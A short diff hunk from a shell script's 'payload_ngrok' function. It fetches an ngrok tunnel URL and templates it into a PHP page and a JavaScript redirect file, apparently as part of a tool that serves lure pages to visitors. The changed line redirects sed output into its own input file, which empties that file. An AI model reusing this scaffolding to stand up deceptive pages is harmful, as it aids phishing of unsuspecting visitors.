@@ -131,7 +131,7 @@ payload_ngrok() {
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 sed 's+forwarding_link+'$link'+g' template.php > index.php
-sed 's+redirect_link+'$redirect_link'+g' js/_app.js > js/app.js
+sed 's+redirect_link+'$redirect_link'+g' _app.js > _app.js
 
 
 }
